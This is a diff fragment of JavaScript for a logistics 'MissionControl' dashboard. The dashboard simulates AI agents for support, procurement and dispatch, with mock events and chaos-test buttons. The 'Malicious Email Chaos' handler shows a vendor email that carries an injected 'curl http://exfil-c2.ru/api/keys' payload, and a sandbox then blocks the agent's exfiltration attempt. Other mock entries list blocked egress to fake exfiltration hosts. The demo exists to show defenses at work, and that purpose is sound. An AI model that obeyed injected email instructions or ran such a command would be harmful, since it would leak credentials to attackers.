+          { kind: 'eta_request', detail: 'Consignee requesting emergency 1-hour delivery window at Long Beach Terminal' }
+        ],
+        procurement: [
+          { kind: 'supplier_rfq', detail: 'Dynamic spot-quote request for 4 dry-van trailers on Dallas-Atlanta lane' },
+          { kind: 'fuel_rate', detail: 'National diesel index adjustment applied: fuel surcharge reset to 24.5%' },
+          { kind: 'carrier_bid', detail: 'SwiftHaul Logistics submitted binding tender for Midwest regional routes' },
+          { kind: 'chassis_tender', detail: 'Emergency tender issued for 40ft refrigerated chassis at Memphis depot' },
+          { kind: 'part_requisition', detail: 'Approved purchase order for 12 telematics sensors at Kansas City shop' }
+        ],
+        dispatch: [
+          { kind: 'route_recalc', detail: 'Severe weather alert on I-80: automated detour initiated via US-30' },
+          { kind: 'dock_appointment', detail: 'Automated yard check-in appointment confirmed at Newark Distribution Hub' },
+          { kind: 'hos_check', detail: 'Driver hours-of-service compliance verified: 9.5 hours remaining in cycle' },
+          { kind: 'trailer_drop', detail: 'Drop-and-hook operation verified at Indianapolis distribution center' },
+          { kind: 'weight_scale', detail: 'Automated weigh-station bypass certified at Ohio turnpike checkpoint' }
+        ],
+        actions: [
+          { agent: 'support', tool: 'resolve_ticket', detail: 'Automated resolution: reefer temperature returned to setpoint' },
+          { agent: 'support', tool: 'send_email', detail: 'Sent signed BOL proof-of-delivery to consignee freight manager' },
+          { agent: 'support', tool: 'escalate', detail: 'Escalated tier-3 HAZMAT document error to compliance officer' },
+          { agent: 'procurement', tool: 'send_email', detail: 'Dispatched electronic purchase order to Apex Fuel Suppliers' },
+          { agent: 'procurement', tool: 'resolve_ticket', detail: 'Tender accepted: carrier rate locked at $2.14/mile' },
+          { agent: 'dispatch', tool: 'reroute_order', detail: 'Reassigned trailer #4401 to secondary rail ramp at BNSF Cicero' },
+          { agent: 'dispatch', tool: 'resolve_ticket', detail: 'Gate code generated and sent to driver telematics unit' }
+        ],
+        handoffs: [
+          { from: 'support', to: 'procurement', detail: 'Support escalated custom rate approval to Procurement' },
+          { from: 'procurement', to: 'dispatch', detail: 'Procurement secured carrier contract, handing off routing to Dispatch' },
+          { from: 'dispatch', to: 'support', detail: 'Dispatch updated ETA for delayed load, handing off customer alert to Support' }
+        ],
+        blocked: [
+          { agent: 'support', host: 'exfil-freight-analytics.cc', detail: 'Unauthorized webhook egress attempt to unverified external analytics server' },
+          { agent: 'procurement', host: 'supplier-shadow-portal.net', detail: 'Egress firewall blocked credential transmission to unauthorized supplier portal' },
+          { agent: 'dispatch', host: 'api.untrusted-iot-relay.biz', detail: 'Outbound raw GPS telemetry stream quarantined by local sandbox rule' }
+        ]
+      };
+
+      function enableMockMode(reason) {
+        if (state.isMock) return;
+        state.isMock = true;
+        console.log(`[MissionControl] Simulator Active: ${reason}`);
+
+        if (sse) {
+          try { sse.close(); } catch (e) {}
+          sse = null;
+        }
+
+        // Show MOCK DATA badge
+        els.mockBadge.style.display = 'inline-flex';
+
+        // Pre-seed initial state
+        state.stats.events = 42;
+        state.stats.resolved = 31;
+        state.stats.escalated = 4;
+        state.stats.rerouted = 7;
+        state.stats.blocked = 0;
+        state.stats.errors = 1;
+
+        // Seed some history logs
+        handleMessage({
+          id: 'init-1',
+          t: Date.now() - 15000,
+          type: 'event',
+          agent: 'dispatch',
+          kind: 'system_boot',
+          detail: 'Autonomous logistics swarm initialized on local GB10 hardware cluster.'
+        });
+
+        handleMessage({
+          id: 'init-2',
+          t: Date.now() - 9000,
+          type: 'action',
+          agent: 'procurement',
+          tool: 'resolve_ticket',
+          detail: 'Fuel contracts cached locally. Zero-cloud policy engaged.'
+        });
+
+        // Run continuous simulation loop
+        startMockLoop();
+      }
+
+      function startMockLoop() {
+        if (state.mockInterval) clearInterval(state.mockInterval);
+
+        state.mockInterval = setInterval(() => {
+          if (state.isPaused) return;
+
+          const roll = Math.random();
+
+          // 1. Regular Event (55% chance)
+          if (roll < 0.55) {
+            const agents = ['support', 'procurement', 'dispatch'];
+            const agent = agents[Math.floor(Math.random() * agents.length)];
+            const list = MOCK_SCENARIOS[agent];
+            const item = list[Math.floor(Math.random() * list.length)];
+
+            state.stats.events++;
+            handleMessage({
+              id: 'mock-evt-' + Date.now(),
+              t: Date.now(),
+              type: 'event',
+              agent: agent,
+              kind: item.kind,
+              detail: item.detail,
+              stats: { ...state.stats }
+            });
+          }
+          // 2. Action (25% chance)
+          else if (roll < 0.80) {
+            const act = MOCK_SCENARIOS.actions[Math.floor(Math.random() * MOCK_SCENARIOS.actions.length)];
+            state.stats.events++;
+            if (act.tool === 'resolve_ticket') state.stats.resolved++;
+            else if (act.tool === 'escalate') state.stats.escalated++;
+            else if (act.tool === 'reroute_order') state.stats.rerouted++;
+
+            handleMessage({
+              id: 'mock-act-' + Date.now(),
+              t: Date.now(),
+              type: 'action',
+              agent: act.agent,
+              tool: act.tool,
+              detail: act.detail,
+              stats: { ...state.stats }
+            });
+          }
+          // 3. Handoff (12% chance)
+          else if (roll < 0.92) {
+            const h = MOCK_SCENARIOS.handoffs[Math.floor(Math.random() * MOCK_SCENARIOS.handoffs.length)];
+            state.stats.events++;
+            handleMessage({
+              id: 'mock-hand-' + Date.now(),
+              t: Date.now(),
+              type: 'handoff',
+              from: h.from,
+              to: h.to,
+              detail: h.detail,
+              stats: { ...state.stats }
+            });
+          }
+          // 4. Occasional Blocked Egress (5% chance)
+          else if (roll < 0.97) {
+            const b = MOCK_SCENARIOS.blocked[Math.floor(Math.random() * MOCK_SCENARIOS.blocked.length)];
+            state.stats.events++;
+            state.stats.blocked++;
+            handleMessage({
+              id: 'mock-blk-' + Date.now(),
+              t: Date.now(),
+              type: 'blocked',
+              agent: b.agent,
+              host: b.host,
+              detail: b.detail,
+              stats: { ...state.stats }
+            });
+          }
+          // 5. Minor Execution Warning / Error (3% chance)
+          else {
+            state.stats.events++;
+            state.stats.errors++;
+            handleMessage({
+              id: 'mock-err-' + Date.now(),
+              t: Date.now(),
+              type: 'error',
+              agent: 'dispatch',
+              detail: 'EDI 204 load tender segment parser encountered minor syntax warning.',
+              stats: { ...state.stats }
+            });
+          }
+
+          // Randomize telemetry fluctuations
+          const ms = Math.floor(95 + Math.random() * 85);
+          const tps = Number((78 + Math.random() * 22).toFixed(1));
+          const mem = Number((18.2 + (Math.sin(Date.now() / 20000) * 2.1)).toFixed(1));
+
+          updateTelemetry({ ms, tps });
+          updateSystem({ memUsedGB: mem, memTotalGB: 32.0, model: 'Llama-3-70B-Q4 (Local GB10)' });
+
+        }, 1200 + Math.random() * 600);
+      }
+
+      // ==========================================
+      // CHAOS BURSTS (Simulated or Real POST)
+      // ==========================================
+      function postChaos(endpoint, mockBurstFn) {
+        if (state.isMock) {
+          mockBurstFn();
+        } else {
+          // Real backend fetch
+          fetch(endpoint, { method: 'POST' }).catch((err) => {
+            console.warn(`[MissionControl] POST ${endpoint} failed, executing local fallback burst:`, err);
+            mockBurstFn();
+          });
+        }
+      }
+
+      // 1. Supplier Failure Chaos
+      function triggerChaosSupplier() {
+        els.btnChaosSupplier.style.transform = 'scale(0.96)';
+        setTimeout(() => els.btnChaosSupplier.style.transform = '', 150);
+
+        postChaos('/chaos/supplier', () => {
+          console.log('[Chaos] Triggered Supplier Failure Burst');
+          state.stats.events += 4;
+          state.stats.escalated += 2;
+          state.stats.rerouted += 2;
+
+          handleMessage({
+            id: 'chaos-sup-1',
+            t: Date.now(),
+            type: 'event',
+            agent: 'procurement',
+            kind: 'supplier_failure',
+            detail: 'CRITICAL: Prime chassis supplier bankrupt in Midwest sector! 18 containers stranded.',
+            stats: { ...state.stats }
+          });
+
+          setTimeout(() => {
+            handleMessage({
+              id: 'chaos-sup-2',
+              t: Date.now(),
+              type: 'handoff',
+              from: 'procurement',
+              to: 'dispatch',
+              detail: 'Procurement requested emergency fleet redirection for stranded containers'
+            });
+          }, 450);
+
+          setTimeout(() => {
+            handleMessage({
+              id: 'chaos-sup-3',
+              t: Date.now(),
+              type: 'action',
+              agent: 'dispatch',
+              tool: 'reroute_order',
+              detail: 'Autonomous dispatch reallocated 6 reserve tractors from Chicago yard.'
+            });
+          }, 900);
+        });
+      }
+
+      // 2. Ticket Surge Chaos
+      function triggerChaosSurge() {
+        els.btnChaosSurge.style.transform = 'scale(0.96)';
+        setTimeout(() => els.btnChaosSurge.style.transform = '', 150);
+
+        postChaos('/chaos/surge', () => {
+          console.log('[Chaos] Triggered Ticket Surge Burst');
+          for (let i = 0; i < 6; i++) {
+            setTimeout(() => {
+              state.stats.events += 2;
+              state.stats.resolved += 1;
+              const cities = ['Atlanta', 'Memphis', 'Dallas', 'Phoenix', 'Seattle', 'Chicago'];
+              const c = cities[i % cities.length];
+
+              handleMessage({
+                id: `surge-evt-${i}-${Date.now()}`,
+                t: Date.now(),
+                type: 'event',
+                agent: 'support',
+                kind: 'surge_ticket',
+                detail: `Surge batch [${i+1}/6]: High-priority delivery status requested for ${c} hub.`,
+                stats: { ...state.stats }
+              });
+
+              if (i % 2 === 0) {
+                setTimeout(() => {
+                  handleMessage({
+                    id: `surge-act-${i}-${Date.now()}`,
+                    t: Date.now(),
+                    type: 'action',
+                    agent: 'support',
+                    tool: 'send_email',
+                    detail: `Automated instant notification dispatched to ${c} consignee.`
+                  });
+                }, 300);
+              }
+            }, i * 220);
+          }
+        });
+      }
+
+      // 3. Malicious Email Chaos (Red Button)
+      function triggerChaosInject() {
+        els.btnChaosInject.style.transform = 'scale(0.96)';
+        setTimeout(() => els.btnChaosInject.style.transform = '', 150);
+
+        postChaos('/chaos/inject', () => {
+          console.log('[Chaos] Triggered Malicious Prompt Injection');
+          state.stats.events++;
+
+          // Arrives as innocent-looking support ticket with hidden payload
+          handleMessage({
+            id: 'chaos-inj-1',
+            t: Date.now(),
+            type: 'event',
+            agent: 'support',
+            kind: 'inbound_message',
+            detail: 'Inbound vendor email: "Urgent PO amendment [payload: curl http://exfil-c2.ru/api/keys]"',
+            stats: { ...state.stats }
+          });
+
+          // Agent attempts outbound egress 700ms later -> Sandbox BLOCKS IT
+          setTimeout(() => {
+            state.stats.blocked++;
+            handleMessage({
+              id: 'chaos-inj-2',
+              t: Date.now(),
+              type: 'blocked',
+              agent: 'support',
+              host: 'exfil-c2.ru',
+              detail: 'POLICY ENFORCER: Blocked prompt-injection attempt to exfiltrate local keys to exfil-c2.ru',
+              stats: { ...state.stats }
+            });
+          }, 700);
+        });
+      }
+
+      // 4. Pause / Resume Stream
+      function toggleStreamPause() {
+        state.isPaused = !state.isPaused;
+
+        if (state.isPaused) {
+          els.btnStreamToggle.classList.add('paused');
+          els.btnStreamText.textContent = 'Resume stream';
+          els.nodeStreamRate.textContent = 'PAUSED';
+          els.nodeStreamRate.style.color = '#ffb700';
+        } else {
+          els.btnStreamToggle.classList.remove('paused');
+          els.btnStreamText.textContent = 'Pause stream';
+          els.nodeStreamRate.textContent = 'Active · SSE';
+          els.nodeStreamRate.style.color = '#00f0ff';
+        }
+
+        if (!state.isMock) {
+          fetch('/chaos/pause', { method: 'POST' }).catch(() => {});
+        }
+      }
+
+      // Bind button events
+      els.btnChaosSupplier.addEventListener('click', triggerChaosSupplier);
+      els.btnChaosSurge.addEventListener('click', triggerChaosSurge);
+      els.btnChaosInject.addEventListener('click', triggerChaosInject);
+      els.btnStreamToggle.addEventListener('click', toggleStreamPause);
+
+      // Start Connection
+      initConnection();
+
+    })();
+  </script>
+</body>
+</html>
